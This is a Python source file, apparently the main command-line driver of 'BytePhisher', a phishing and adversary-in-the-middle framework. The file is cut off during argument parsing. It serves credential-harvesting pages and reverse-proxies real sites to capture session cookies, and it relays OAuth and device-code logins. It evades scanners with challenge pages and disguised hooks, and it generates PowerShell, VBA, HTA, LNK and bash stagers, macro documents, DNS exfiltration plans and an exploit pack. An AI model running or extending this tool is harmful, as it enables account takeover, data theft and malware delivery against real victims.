#!/usr/bin/env python3
"""
BytePhisher - advanced phishing / AiTM red-team framework.

Pure-Python: no PHP. Hundreds of built-in templates, concurrent tunnels, SQLite capture store,
live TUI + optional web dashboard, SMTP spear-phishing module.

Usage:
    python3 bytephisher.py --list
    python3 bytephisher.py -o 3 -t cloudflared
    python3 bytephisher.py -o google -t all --otp --redirect https://example.com
    python3 bytephisher.py --tunnels --port 8080 --web-dashboard
    python3 bytephisher.py --export out.csv

Flags mirror (and extend) PyPhisher/ZPhisher/BlackEye conventions:
    -o  template index (see --list) or slug (google, instagram, ...)
    -t  tunneler: cloudflared | localhost_run | bore | pinggy | ngrok | all | none
    -u  redirect URL after capture
    -p  local port (default 8080)
    -m  mode: normal | test   (test = no tunnels, local only)
"""
import argparse
import contextlib
import json
import os
import random
import signal
import sys
import time
import urllib.parse


def _harden_console():
    """Make output survivable on a console that cannot encode it.

    Windows consoles default to cp437/cp1252. Any character outside that
    codepage (an arrow, a box-drawing char, an accented name from a capture)
    raised UnicodeEncodeError and killed the process -- `--help` exited 1.
    Two layers of defence:
      1. every console-facing string in this tool is ASCII (enforced by a test),
      2. stdout/stderr degrade unencodable characters to "?" instead of raising,
         so a victim-supplied string can never crash the operator's terminal.
    """
    for name in ("stdout", "stderr"):
        stream = getattr(sys, name, None)
        if stream is None:
            continue
        with contextlib.suppress(Exception):
            stream.reconfigure(errors="replace")   # keep encoding, never raise
    if os.name == "nt":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleOutputCP(65001)   # UTF-8 where possible
        except Exception:
            pass


_harden_console()

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)


def resolve_home():
    """Where config/templates/data live.

    Order: $BYTEPHISHER_HOME -> the directory this module lives in (source
    checkout or editable install) -> the current working directory. A pip-installed
    copy inside site-packages is read-only, so we fall back to CWD instead of
    failing when it tries to write templates/ or data/.
    """
    env = os.environ.get("BYTEPHISHER_HOME")
    if env and os.path.isdir(env):
        return os.path.abspath(env)
    if os.path.isdir(os.path.join(HERE, "config")) or os.access(HERE, os.W_OK):
        return HERE
    return os.getcwd()


HOME = resolve_home()

from core import __version__ as core_version  # noqa: E402
from core import capture as cap  # noqa: E402
from core import server as srv  # noqa: E402
from core import symbols as symbols_mod  # noqa: E402
from core import templates as tpl  # noqa: E402
from core import transport  # noqa: E402
from tunnels import REGISTRY as TUNNEL_REGISTRY  # noqa: E402
from tunnels import reason_for, run_all, run_one  # noqa: E402

# single source of truth: core/__init__.py (reports, net UA and the
# Docker labels all derive from this one value)
VERSION = core_version
TEMPLATES_DIR = os.path.join(HOME, "templates")
DEFAULT_DB = os.path.join(HOME, "data", "bytephisher.db")
CONFIG_PATH = os.path.join(HOME, "config", "config.yaml")


# ---------------------------------------------------------------- config ----
def load_config():
    cfg = {
        "port": 8080, "db_path": DEFAULT_DB, "geo_provider": "ipapi",
        "redirect_url": "", "tunneler_default": "cloudflared", "otp_default": False,
    }
    try:
        import yaml
        if os.path.isfile(CONFIG_PATH):
            with open(CONFIG_PATH, encoding="utf-8") as f:
                cfg.update(yaml.safe_load(f) or {})
    except Exception as e:
        print(f"[bytephisher] config load skipped: {e}")
    if not os.path.isabs(cfg.get("db_path", "")):
        cfg["db_path"] = os.path.join(HOME, cfg["db_path"])
    return cfg


# ------------------------------------------------------------- templates ----
def inline_oauth(args):
    """Build the OAuth relay spec from the `--oauth*` flags (None when unset)."""
    provider = getattr(args, "oauth", "")
    if not provider:
        return None
    from core.oauth import OauthError, OauthSpec
    try:
        spec = OauthSpec(provider=provider,
                         client_id=getattr(args, "oauth_client_id", ""),
                         tenant=getattr(args, "oauth_tenant", "") or None,
                         scope=(getattr(args, "oauth_scope", "") or None),
                         redirect_uri=getattr(args, "oauth_redirect", ""))
    except OauthError as e:
        print(f"[bytephisher] --oauth refused: {e}")
        return None
    print(f"[bytephisher] oauth    : {spec.provider} consent relay "
          f"(client {spec.client_id[:12]}..., scopes: {spec.scope or '-'})")
    return spec


def inline_intercepts(args):
    """Build `Intercept` objects from `--intercept PATH=FILE` / `--intercept-body PATH=TEXT`.

    A file that cannot be read is reported and skipped: a typo must not silently turn into a
    forwarded request to the real host, and it must not kill the campaign either.
    """
    from core.phishlet import Intercept
    out = []
    for spec in (getattr(args, "intercept", None) or []):
        path, _, target = str(spec).partition("=")
        if not path or not target:
            print(f"[bytephisher] --intercept {spec!r} is not PATH=FILE - skipped")
            continue
        try:
            with open(target, "rb") as fh:
                blob = fh.read()
        except OSError as e:
            print(f"[bytephisher] --intercept {path} skipped: {e}")
            continue
        ctype = ("application/json" if target.endswith(".json") else
                 "text/javascript" if target.endswith((".js", ".mjs")) else
                 "text/css" if target.endswith(".css") else
                 "text/html" if target.endswith((".html", ".htm")) else "text/plain")
        out.append(Intercept(path=path, body=blob, content_type=ctype))
    for spec in (getattr(args, "intercept_body", None) or []):
        path, _, text = str(spec).partition("=")
        if path and text:
            out.append(Intercept(path=path, body=text, content_type="application/json"))
    return out


def inline_phishlet(args):
    """The phishlet built from `--upstream` (no YAML file needed).

    Kept as a function so a test can build one without starting a server. The
    auth-token rule is the important part: with none, NO cookie was ever considered a
    session token, so the session never flipped to captured and nothing was vaulted.
    """
    from core.phishlet import AuthToken
    from core.proxy import Phishlet
    return Phishlet(
        name=args.campaign or args.upstream.split(":")[0],
        upstream=args.upstream, scheme=args.proxy_scheme,
        login_path=args.login_path,
        capture_cookies=[c.strip() for c in args.capture_cookies.split(",") if c.strip()] or ["*"],
        inject_paths=[p.strip() for p in args.inject_paths.split(",") if p.strip()] or [".*"],
        block_paths=[p.strip() for p in args.block_paths.split(",") if p.strip()],
        auth_tokens=[AuthToken(keys=[".*:regexp"], domain="")],
        intercepts=inline_intercepts(args),
        oauth=inline_oauth(args),
        verify_tls=not args.no_verify_tls,
        intel_perms=args.intel_perms,
        decoy=args.decoy_mode, unauth_url=args.decoy or "")


def panic_handlers(db, stop):
    """The two panic commands as plain callables.

    Kept out of the control-channel block so they can be exercised directly: a
    panic path that only runs when Telegram is reachable is a panic path nobody
    has ever tested.
    """
    def _panic(_args=None):
        stop["flag"] = True
        return "campaign stopped; tunnels and server are shutting down"

    def _kill(_args=None):
        stop["flag"] = True
        try:
            removed = db.wipe("all")
        except Exception as e:                       # never leave the campaign up
            return f"campaign stopped (the wipe reported {type(e).__name__})"
        if removed.get("failed"):
            return ("campaign stopped, but the store wipe reported failures: "
                    + ", ".join(f"{k}: {v}" for k, v in removed["failed"].items()))
        return ("campaign stopped and the store wiped: "
                + ", ".join(f"{k}={v}" for k, v in removed.items()))

    return _panic, _kill


def load_manifest():
    import json
    man_path = os.path.join(TEMPLATES_DIR, "templates.json")
    if not os.path.isfile(man_path):
        print("[bytephisher] templates not generated yet - running generator ...")
        # The generator ships with the CODE, not with the data home: with
        # BYTEPHISHER_HOME pointing at a fresh directory (or a container volume)
        # there is no tools/ under HOME, so resolve it relative to this file.
        src_tools = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools")
        if os.path.isdir(src_tools) and src_tools not in sys.path:
            sys.path.insert(0, src_tools)
        try:
            from gen_templates import main as gen_main
        except ImportError as e:
            raise SystemExit(
                f"[bytephisher] template generator unavailable: {e}") from None
        gen_main()
    if not os.path.isfile(man_path):
        raise SystemExit(f"[bytephisher] template generation produced no manifest "
                         f"at {man_path}")
    with open(man_path, encoding="utf-8") as f:
        man = json.load(f)
    # manifest dirs are relative to the templates root (portable across a move)
    for t in man:
        t["dir"] = tpl.resolve_dir(t.get("dir"), TEMPLATES_DIR)
    return man


def resolve_template(man, option):
    """Accepts index ('3'), slug ('google'), or None (menu)."""
    if option is None:
        print_templates(man)
        try:
            option = input(f"Select template [1-{len(man)}] > ").strip()
        except EOFError:
            sys.exit(2)
    if str(option).isdigit():
        idx = int(option)
        for t in man:
            if t["index"] == idx:
                return t
        raise SystemExit(f"[bytephisher] no template with index {idx}")
    s = str(option).lower().strip()
    for t in man:
        if t["slug"] == s or s in t["dir"].lower():
            return t
    raise SystemExit(f"[bytephisher] no template matching '{option}'")


def print_templates(man):
    print(f"\n  BytePhisher templates ({len(man)}):")
    for t in man:
        print(f'   {t["index"]:>3}. {t["name"]:<22} [{t["slug"]}]')
    print()


# -------------------------------------------------------------- banners -----
BANNER = r"""
  ____        _         ____  _     _     _
 | __ ) _   _| |_ ___  |  _ \| |__ (_)___| |__   ___ _ __
 |  _ \| | | | __/ _ \ | |_) | '_ \| / __| '_ \ / _ \ '__|
 | |_) | |_| | ||  __/ |  __/| | | | \__ \ | | |  __/ |
 |____/ \__, |\__\___| |_|   |_| |_|_|___/_| |_|\___|_|
        |___/     v{ver}   pure-python | {count} | {tunnels} tunnels
"""

def banner(count="?"):
    """Print the splash. `count` is either the template count or a mode label:
    proxy mode uses no static templates and used to print a bare "0 templates",
    which reads like a broken install."""
    # The tunnel count comes from the registry: the banner used to hardcode
    # "6 tunnels" while five adapters were registered.
    from tunnels import REGISTRY as _TUNNELS
    print(BANNER.format(ver=VERSION, count=count, tunnels=len(_TUNNELS)))


# ------------------------------------------------------------- main run -----
def cfg_db_path():
    """The database path from the config, resolved - used by --lab-check, which runs
    before the config object exists."""
    try:
        cfg = load_config()
        p = cfg.get("db_path") or DEFAULT_DB
        return p if os.path.isabs(p) else os.path.join(HOME, p)
    except Exception:
        return DEFAULT_DB


def _load_json(path):
    with open(path, encoding="utf-8") as fh:
        return json.load(fh)


def _clean_error(fn, *a, **kw):
    """Run a step and turn the errors an operator actually hits into one line.

    A missing file, a name that does not resolve, a refused connection and a broken JSON dump
    all reached the operator as a twenty-line traceback from _run (which catches only
    BrokenPipeError and KeyboardInterrupt).
    """
    try:
        return fn(*a, **kw)
    except FileNotFoundError as e:
        print(f"[bytephisher] no such file: {e.filename or e}")
        return None
    except json.JSONDecodeError as e:
        print(f"[bytephisher] that file is not JSON: {e}")
        return None
    except OSError as e:
        print(f"[bytephisher] {type(e).__name__}: {e}")
        return None


def _with_scheme(url, default="http"):
    """Add a scheme to a bare host or host:port so urllib can build a URL.

    '--adcs-probe 127.0.0.1' and '--verify-chain 127.0.0.1:1' used to build
    '127.0.0.1/certsrv/...' and fail with 'unknown url type', so a reachable CA
    was reported unreachable. A value that already carries a scheme is left alone.
    """
    s = str(url or "").strip()
    if s and "://" not in s:
        s = f"{default}://{s}"
    return s


def _pwa_config(args):
    """The installable-page config: a name, the manifest inside the hook namespace, and the
    worker the collector already ships (two workers cannot share a scope)."""
    base = (args.hook_path or "/__bh").rstrip("/")
    name = args.pwa_name or args.campaign or args.upstream or "Portal"
    return {"name": name, "short_name": name[:12], "start_url": "/",
            "manifest_path": f"{base}/app.webmanifest",
            "sw_path": f"{base}/sw.js", "prompt": True}


# ---------------------------------------------------------------------------
# click-to-access commands
#
# --access-plan / --access-build / --artifact / --pack-* / --totp-* / --dnsx-* /
# --capabilities. Each command is a function taking the parsed args, so a test drives it
# without spawning a subprocess. Exit codes are the same everywhere: 0 worked, 1 nothing
# matched, 2 refused (bad input, missing file, unsupported kind).
# ---------------------------------------------------------------------------

ARTIFACT_KINDS = {
    "object": "a page whose hidden sub-resource makes MSHTML speak NTLM",
    "url": "an Internet shortcut to the URL",
    "lnk": "a shortcut that runs the PowerShell stager",
    "hta": "an HTML application that runs the stager",
    "sct": "a scriptlet that fetches the stager",
    "js": "the browser stager",
    "ps": "the PowerShell stager",
    "vba": "the VBA macro source",
    "bash": "the POSIX stager",
    "lnkcmd": "the cmd.exe command line a shortcut runs",
    "docm": "a macro document (binary; needs --artifact-out)",
    "dnsplan": "the DNS query plan (needs --artifact-zone)",
    "intranet": "the local-service table as JSON",
    "pack": "the shipped exploit pack as JSON",
}

# Kinds whose output is binary: printing them to a terminal helps nobody.
ARTIFACT_BINARY = ("url", "lnk", "docm")


def _facts_spec(spec, db):
    """Facts for the access commands, from a JSON object, @file, an OS name, or 'latest'.

    'latest' reads the newest device dump and fills in only what that record states. A
    user agent is not a LAN inventory: the relay, rebind and policy facts stay unset, so
    the matrix reports them as missing instead of assuming them.
    """
    from core import decision as _decision
    text = (spec or "latest").strip()
    if text.startswith("@"):
        data = _clean_error(_load_json, text[1:])
        if data is None:
            raise SystemExit(2)
        if not isinstance(data, dict):
            print(f"[bytephisher] {text[1:]} must hold a JSON object")
            raise SystemExit(2)
        return data
    if text.startswith(("{", "[")):
        try:
            data = json.loads(text)
        except json.JSONDecodeError as e:
            print(f"[bytephisher] facts are not JSON: {e}")
            raise SystemExit(2) from None
        if not isinstance(data, dict):
            print("[bytephisher] facts must be a JSON object")
            raise SystemExit(2)
        return data
    if text.startswith("Mozilla/"):
        # A user agent, not an OS name: facts_from_ua reads the OS family, the browser
        # family and the version out of it, and leaves the facts a UA cannot state (the
        # LAN inventory) unset so the matrix reports them as missing.
        facts = _decision.facts_from_ua(text)
        print(f"[bytephisher] facts from the user agent: os={facts['os']} "
              f"browser={facts['browser']} version={facts['version']}")
        return facts
    if text in ("latest", ""):
        if db is None:
            print("[bytephisher] no capture store to read a device dump from")
            raise SystemExit(2)
        rec = db.intel_get("latest")
        if not rec:
            print("[bytephisher] no device dump yet; pass facts as JSON or @file")
            raise SystemExit(2)
        facts = _decision.facts_from_ua(rec.get("ua") or "")
        print(f"[bytephisher] facts from device dump {rec.get('sid') or '?'}: "
              f"os={facts['os']} browser={facts['browser']} version={facts['version']}")
        return facts
    return {"os": text}


def access_plan_command(args, db=None):
    """Print the ranked access paths this victim allows."""
    from core import decision as _decision
    try:
        # Explicit facts win: --access-plan defaults to "latest", which would otherwise
        # shadow a --access-facts value the operator did pass.
        facts = _facts_spec(args.access_facts or args.access_plan, db)
    except SystemExit as exc:
        return int(exc.code or 2)
    verdict = _decision.decide(facts)
    print(_decision.explain(verdict))
    absent = sorted(name for name, present in (verdict.get("capabilities") or {}).items()
                    if not present)
    if absent:
        print(f"unavailable modules: {', '.join(absent)}")
    return 0


def access_build_command(args, db=None):
    """Write the artifacts the verdict calls for into the output directory."""
    from core import ctso as _ctso
    try:
        facts = _facts_spec(args.access_facts or args.access_plan, db)
    except SystemExit as exc:
        return int(exc.code or 2)
    try:
        manifest = _ctso.build_artifacts(facts, args.access_build,
                                         public_url=args.access_url,
                                         payload_url=args.access_payload,
                                         dns_zone=args.access_zone)
    except (ValueError, OSError) as e:
        print(f"[bytephisher] cannot build artifacts: {type(e).__name__}: {e}")
        return 2
    counts = manifest["counts"]
    print(f"[bytephisher] {args.access_build}: {counts['built']} built, "
          f"{counts['needs-input']} needs input, {counts['skipped']} skipped")
    for record in manifest["artifacts"]:
        detail = ""
        if record.get("needs"):
            detail = "  needs " + ", ".join(record["needs"])
        elif record.get("reason"):
            detail = f"  {record['reason']}"
        print(f"  {record['status']:<11} {record['file']}{detail}")
    for step in manifest.get("operator_steps") or []:
        print(f"  next: {step}")
    print(f"  manifest: {os.path.join(args.access_build, _ctso.MANIFEST_NAME)}")
    return 0


def _artifact_payload(kind, args):
    """(bytes, suggested file name) for one --artifact kind. Raises ValueError with the
    missing input named."""
    from core import dnsx, exploitpack, exploits, mshtml, stager, vba
    url = args.artifact_url or args.access_url
    needs_url = ("object", "url", "lnk", "hta", "sct", "docm", "js", "ps", "vba", "bash",
                 "lnkcmd")
    if kind in needs_url and not url:
        raise ValueError(f"--artifact {kind} needs --artifact-url URL")
    if kind == "object":
        return mshtml.object_page(url).encode("utf-8"), "trigger.html"
    if kind == "url":
        return bytes(mshtml.url_shortcut(url)), "trigger.url"
    if kind == "lnk":
        command = stager.powershell(url, style="enc")
        _, _, arguments = command.partition(" ")
        return bytes(mshtml.lnk("powershell.exe", arguments=arguments)), "payload.lnk"
    if kind == "hta":
        return mshtml.hta(url).encode("utf-8"), "payload.hta"
    if kind == "sct":
        return mshtml.sct(url).encode("utf-8"), "payload.sct"
    if kind == "js":
        return stager.js({"url": url, "mode": "beacon"}).encode("utf-8"), "stager.js"
    if kind == "ps":
        return (stager.powershell(url, style="enc") + "\n").encode("utf-8"), "stager.ps1"
    if kind == "vba":
        return (stager.vba(url) + "\n").encode("utf-8"), "stager.vba"
    if kind == "bash":
        return (stager.bash(url) + "\n").encode("utf-8"), "stager.sh"
    if kind == "lnkcmd":
        return (stager.lnk_command(url) + "\n").encode("utf-8"), "payload.cmd"
    if kind == "docm":
        template = args.artifact_template or None
        return bytes(vba.docm(vba.open_macro(url), module="Module1",
                              template=template)), "payload.docm"
    if kind == "dnsplan":
        zone = args.artifact_zone or args.access_zone
        if not zone:
            raise ValueError("--artifact dnsplan needs --artifact-zone ZONE")
        data = (args.artifact_url or "beacon").encode("utf-8")
        plan = dnsx.query_plan(data, zone)
        return (json.dumps(plan, indent=2, sort_keys=True, default=str) + "\n").encode(
            "utf-8"), "dns_plan.json"
    if kind == "intranet":
        rows = getattr(exploits, "EXPLOITS", [])
        return (json.dumps(rows, indent=2, sort_keys=True, default=str) + "\n").encode(
            "utf-8"), "intranet.json"
    if kind == "pack":
        return (json.dumps(exploitpack.PACK, indent=2, sort_keys=True, default=str) + "\n"
                ).encode("utf-8"), "pack.json"
    raise ValueError(f"unknown --artifact kind {kind!r}")


def artifact_command(args):
    """Build one artifact: print it, or write it with --artifact-out."""
    kind = (args.artifact or "").strip().lower()
    if kind not in ARTIFACT_KINDS:
        print(f"[bytephisher] --artifact takes one of: "
              f"{', '.join(sorted(ARTIFACT_KINDS))}")
        return 2
    try:
        data, name = _artifact_payload(kind, args)
    except (ValueError, LookupError, TypeError) as e:
        print(f"[bytephisher] {e}")
        return 2
    if args.artifact_out:
        try:
            with open(args.artifact_out, "wb") as handle:
                handle.write(data)
        except OSError as e:
            print(f"[bytephisher] cannot write {args.artifact_out}: "
                  f"{type(e).__name__}: {e}")
            return 2
        print(f"[bytephisher] {kind} -> {args.artifact_out} ({len(data)} bytes)")
        return 0
    if kind in ARTIFACT_BINARY:
        print(f"[bytephisher] {kind} is binary; write it with --artifact-out {name}")
        return 2
    sys.stdout.write(data.decode("utf-8", "replace"))
    return 0


def pack_command(args):
    """List, match, verify or report the exploit pack."""
    from core import exploitpack as _pack
    if args.pack_list:
        for entry in _pack.PACK:
            print(_pack.describe(entry))
        print(f"[bytephisher] {len(_pack.PACK)} pack entries")
        return 0
    if args.pack_match:
        key, _, value = args.pack_match.partition(":")
        key, value = key.strip().lower(), value.strip()
        if key in ("browser", "os", "service"):
            facts = {key: value}
        elif key.isdigit():
            facts = {"browser": args.pack_match, "version": int(key)}
        else:
            facts = {"browser": key, "version": int(value) if value.isdigit() else None}
        matches = _pack.match(facts)
        if not matches:
            print(f"[bytephisher] no pack entry matches {args.pack_match}")
            return 1
        for entry in matches:
            print(f"{entry.get('confidence', '?'):<10} {entry.get('name', '?')} "
                  f"({entry.get('cve', '?')}) - {entry.get('why', '')}")
        return 0
    if args.pack_verify:
        rows = [_pack.verify(args.pack_verify, entry) for entry in _pack.PACK]
        for row in rows:
            if not row["ok"]:
                print(f"  missing  {row.get('path', '?')}  {row.get('why', '')}")
        present = sum(1 for row in rows if row["ok"])
        print(f"[bytephisher] {present}/{len(rows)} payloads present under "
              f"{args.pack_verify}")
        return 0 if present else 1
    if args.pack_report:
        report = _pack.report(args.pack_report)
        print(json.dumps(report, indent=2, sort_keys=True, default=str))
        return 0
    return 0


def totp_command(args):
    """Read a soft-2FA secret or code. The secret itself is never printed."""
    from core import totp as _totp
    if args.totp_uri:
        try:
            info = _totp.parse_otpauth(args.totp_uri)
        except ValueError as e:
            print(f"[bytephisher] {e}")
            return 2
        for key in ("type", "account", "issuer", "digits", "period", "algo"):
            if info.get(key) not in (None, ""):
                print(f"{key}: {info[key]}")
        print("secret: <held>")
        return 0
    if args.totp_code:
        at = args.totp_at if args.totp_at is not None else time.time()
        try:
            current = _totp.code(args.totp_code, at)
            window = _totp.codes_in_window(args.totp_code, at)
        except (ValueError, TypeError) as e:
            print(f"[bytephisher] {e}")
            return 2
        print(f"code: {current}")
        print(f"window: {', '.join(window)}")
        print(f"at: {int(at)}")
        return 0
    if args.totp_scan:
        at = args.totp_at if args.totp_at is not None else time.time()
        try:
            found = _totp.weak_secret_scan(args.totp_scan, at, space=args.totp_space)
        except ValueError as e:
            print(f"[bytephisher] {e}")
            return 2
        if not found:
            print(f"[bytephisher] no secret in the {args.totp_space} space produces "
                  f"{args.totp_scan} at {int(at)}")
            return 1
        for row in found:
            print(f"secret: {row.get('secret', '?')}  ({row.get('why', '')})")
        return 0
    return 0


def dnsx_command(args):
    """Encode, plan or reassemble the DNS exfiltration channel."""
    from core import dnsx as _dnsx
    if args.dnsx_encode:
        zone = args.access_zone or args.artifact_zone
        try:
            if zone:
                # The names the resolver actually sees carry the chunk index and the zone;
                # printing the bare labels would not round-trip through --dnsx-decode.
                names = _dnsx.query_plan(args.dnsx_encode.encode("utf-8"), zone)["qnames"]
            else:
                names = _dnsx.encode_labels(args.dnsx_encode.encode("utf-8"))
        except ValueError as e:
            print(f"[bytephisher] {e}")
            return 2
        print("\n".join(names))
        return 0
    if args.dnsx_plan:
        zone = args.access_zone or args.artifact_zone
        if not zone:
            print("[bytephisher] --dnsx-plan needs a zone: pass --access-zone ZONE")
            return 2
        plan = _dnsx.query_plan(args.dnsx_plan.encode("utf-8"), zone)
        print(json.dumps(plan, indent=2, sort_keys=True, default=str))
        return 0
    if args.dnsx_decode:
        names = [n.strip() for n in args.dnsx_decode.split(",") if n.strip()]
        try:
            data = _dnsx.decode_session(names, args.access_zone or "")
        except ValueError as e:
            print(f"[bytephisher] {e}")
            return 2
        sys.stdout.write(data.decode("utf-8", "replace") + "\n")
        return 0
    return 0


def capabilities_command():
    """Which optional capability modules this tree can import."""
    from core import decision as _decision
    cap_map = _decision.capabilities()
    for name in _decision.CAPABILITIES:
        module = cap_map.get(name)
        if module is None:
            print(f"{'absent':<8} {name}")
        else:
            print(f"{'present':<8} {name:<12} {getattr(module, '__file__', '')}")
    present = sum(1 for name in _decision.CAPABILITIES if cap_map.get(name) is not None)
    print(f"[bytephisher] {present}/{len(_decision.CAPABILITIES)} capability modules "
          f"present")
    return 0


def access_dispatch(args, db=None):
    """Route the click-to-access commands to their handler."""
    if args.capabilities:
        return capabilities_command()
    if args.pack_list or args.pack_match or args.pack_verify or args.pack_report:
        return pack_command(args)
    if args.totp_uri or args.totp_code or args.totp_scan:
        return totp_command(args)
    if args.dnsx_plan or args.dnsx_encode or args.dnsx_decode:
        return dnsx_command(args)
    if args.artifact:
        return artifact_command(args)
    if args.access_build:
        return access_build_command(args, db)
    return access_plan_command(args, db)


def _access_requested(args):
    """True when any click-to-access command was asked for on this invocation."""
    return bool(args.access_plan or args.access_build or args.artifact or args.pack_list
                or args.pack_match or args.pack_verify or args.pack_report
                or args.totp_uri or args.totp_code or args.totp_scan
                or args.dnsx_plan or args.dnsx_encode or args.dnsx_decode
                or args.capabilities)


def main():
    # Line-buffered stdout: this CLI is routinely piped into files/logs, and a
    # block-buffered pipe means the operator sees nothing until the process
    # exits (cloudflared URLs, capture alerts, session summary all go missing).
    try:
        sys.stdout.reconfigure(line_buffering=True)
        sys.stderr.reconfigure(line_buffering=True)
    except Exception:
        pass

    ap = argparse.ArgumentParser(
        prog="bytephisher", add_help=True,
        description="BytePhisher - advanced phishing / AiTM framework")
    ap.add_argument("-o", "--option",
                    help="template index (see --list) or slug (google, instagram, ...)")
    ap.add_argument("-t", "--tunneler", default=None,
                    help="cloudflared|localhost_run|bore|pinggy|ngrok|all|none")
    ap.add_argument("-u", "--url", dest="url", default=None, help="redirect URL after capture")
    ap.add_argument("-p", "--port", type=int, default=None, help="local port (default 8080)")
    ap.add_argument("-m", "--mode", default="normal", choices=["normal", "test"],
                    help="normal = tunnels up; test = local only")
    ap.add_argument("--otp", action="store_true", help="serve OTP page after credential submit")
    ap.add_argument("--tls", action="store_true", help="serve HTTPS (needs --cert)")
    ap.add_argument("--cert", default=None, help="PEM cert (+key at same path with 'key' in name)")
    ap.add_argument("--geo", default=None, choices=["ipapi", "ipinfo", "off"], help="geo provider")
    ap.add_argument("--list", action="store_true", help="list templates and exit")
    ap.add_argument("--tunnels", action="store_true", help="list tunnelers and exit")
    ap.add_argument("--doctor", action="store_true",
                    help="check this machine can run a campaign (deps, templates, "
                         "tunnelers, DB) and exit")
    ap.add_argument("--web-dashboard", action="store_true", help="start Flask dashboard on :8090")
    ap.add_argument("--web-port", type=int, default=8090, help="web dashboard port")
    ap.add_argument("--export", metavar="PATH",
                    help="export captures (.json -> JSON, anything else -> CSV) and exit")
    ap.add_argument("--reuse", action="store_true",
                    help="show credential-reuse findings (repeated identities/passwords) "
                         "across the database and exit")
    # ---- reverse-proxy mode (real site proxied live, hook injected) ----
    ap.add_argument("--lab-check", action="store_true",
                    help="run the real-world preflight (tools/lab_check.py) and exit: "
                         "tenant, domain/TLS, egress, clock, database, and whether a "
                         "browser can reach a live host on this machine")
    ap.add_argument("--lab-domain", metavar="DOMAIN",
                    help="with --lab-check: also check this domain's DNS and TLS")
    ap.add_argument("--lab-tunnel", metavar="URL",
                    help="with --lab-check: also probe this public URL")
    ap.add_argument("--resume-hours", type=float, default=12.0, metavar="H",
                    help="on startup, restore sessions that were active in the last H "
                         "hours so a restart does not orphan a victim mid-session "
                         "(default 12; 0 disables)")
    ap.add_argument("--panic", action="store_true",
                    help="stop serving now and keep the data (console equivalent of the "
                         "control channel's /panic)")
    ap.add_argument("--kill", action="store_true",
                    help="stop and WIPE every capture, session, intel row and lure "
                         "(needs --yes)")
    ap.add_argument("--yes", action="store_true", help="confirm a destructive flag")
    ap.add_argument("--verify-brand", default="", metavar="NAME",
                    help="brand to show on the pre-serve interstitial (default: none - "
                         "the page is deliberately brand-neutral)")
    ap.add_argument("--verify-first", action="store_true",
                    help="pre-serve human challenge: a first visit gets a small "
                         "brand-neutral interstitial instead of the page, and only a "
                         "visitor that interacts and passes the passive tells gets a "
                         "signed token for the real page (proxy mode; a scanner that "
                         "runs no JS, or runs it without interacting, never sees it)")
    ap.add_argument("--verify-ttl", type=int, default=900, metavar="SECONDS",
                    help="how long a passed challenge stays valid (default 900)")
    ap.add_argument("--symbols", choices=["fixed", "random"], default="fixed",
                    help="cookie and data-attribute names: 'fixed' keeps the "
                         "historical __bhs/__bhi/data-* (tooling and runbooks rely on "
                         "them), 'random' derives a fresh set per campaign so one "
                         "fingerprint does not cover every campaign "
                         "(tools/campaign.sh uses random)")
    ap.add_argument("--hook-stealth", dest="hook_stealth", action="store_true",
                    default=True,
                    help="make the injected hook's patched fetch/XHR look native: "
                         "Function.prototype.toString reports '[native code]' and the "
                         "wrapper's name/arity/descriptor match the original (on by "
                         "default - a wrapped builtin is how an integrity script "
                         "catches the hook)")
    ap.add_argument("--no-hook-stealth", dest="hook_stealth", action="store_false",
                    help="leave the wrappers exposed (only for debugging the hook)")
    ap.add_argument("--no-impersonate", action="store_true",
                    help="do NOT shape the upstream leg like a browser (the loudest "
                         "signal on the wire - only for a target that chokes on it)")
    ap.add_argument("--devicecode", metavar="PROVIDER",
                    help="device-authorization mode (RFC 8628): hand the victim a "
                         "code and the REAL provider page - no lookalike domain. "
                         "providers: microsoft, microsoft-graph, google, okta, "
                         "github, custom (see core/devicecode.py)")
    ap.add_argument("--dc-client-id", metavar="ID",
                    help="public client id of YOUR app with the device-code flow "
                         "enabled (required with --devicecode; a guessed id fails)")
    ap.add_argument("--dc-tenant", metavar="T",
                    help="tenant for microsoft/okta (default: the provider's)")
    ap.add_argument("--dc-scope", metavar="SCOPES",
                    help="override the provider's default scope")
    ap.add_argument("--dc-brand", default="Account", metavar="NAME",
                    help="title on the landing page (default: Account)")
    ap.add_argument("--dc-base", metavar="URL",
                    help="public base URL of the landing (default: the tunnel URL)")
    ap.add_argument("--proxy", action="store_true",
                    help="run in reverse-proxy mode: proxy the REAL site and inject "
                         "the capture hook (needs --phishlet or --upstream)")
    ap.add_argument("--phishlet", metavar="YAML",
                    help="phishlet definition file for --proxy")
    ap.add_argument("--upstream", metavar="HOST[:PORT]",
                    help="target host to proxy (inline phishlet, no YAML needed)")
    ap.add_argument("--proxy-scheme", default="https", choices=["http", "https"],
                    help="scheme used to reach the upstream (default https)")
    ap.add_argument("--login-path", default="/", help="login path on the upstream")
    ap.add_argument("--capture-cookies", default="*",
                    help="cookie names to harvest (comma separated, * = all)")
    ap.add_argument("--inject-paths", default=".*",
                    help="regexes of paths that get the hook (comma separated)")
    ap.add_argument("--oauth", default="", metavar="PROVIDER",
                    help="OAuth consent/authorization-code relay (microsoft/google/okta/"
                         "github/custom): the victim's browser goes to the REAL provider and "
                         "the code comes back here - no lookalike login page")
    ap.add_argument("--oauth-client-id", default="", metavar="ID",
                    help="the public client id registered with the redirect URI below")
    ap.add_argument("--oauth-tenant", default="", metavar="TENANT",
                    help="tenant id/subdomain, or the base URL for `custom`")
    ap.add_argument("--oauth-scope", default="", metavar="SCOPE",
                    help="space-separated scopes (default: the provider's own set)")
    ap.add_argument("--oauth-redirect", default="", metavar="URL",
                    help="override the redirect URI (default: this campaign's callback)")
    ap.add_argument("--intercept", action="append", default=[], metavar="PATH=FILE",
                    help="answer PATH locally from FILE instead of forwarding it (repeatable): "
                         "a telemetry endpoint never sees our page, and content we cannot "
                         "rewrite stops breaking the page")
    ap.add_argument("--intercept-body", action="append", default=[], metavar="PATH=TEXT",
                    help="same as --intercept but with an inline body")
    ap.add_argument("--block-paths", default="",
                    help="regexes of paths never touched (comma separated)")
    ap.add_argument("--no-verify-tls", action="store_true",
                    help="do not verify the upstream TLS certificate")
    # ---- lures (tracked entry points) ----
    ap.add_argument("--lure-create", action="store_true",
                    help="create a tracked lure for a campaign and exit")
    ap.add_argument("--lure-kind", default="link",
                    choices=["link", "fragment", "one-time"],
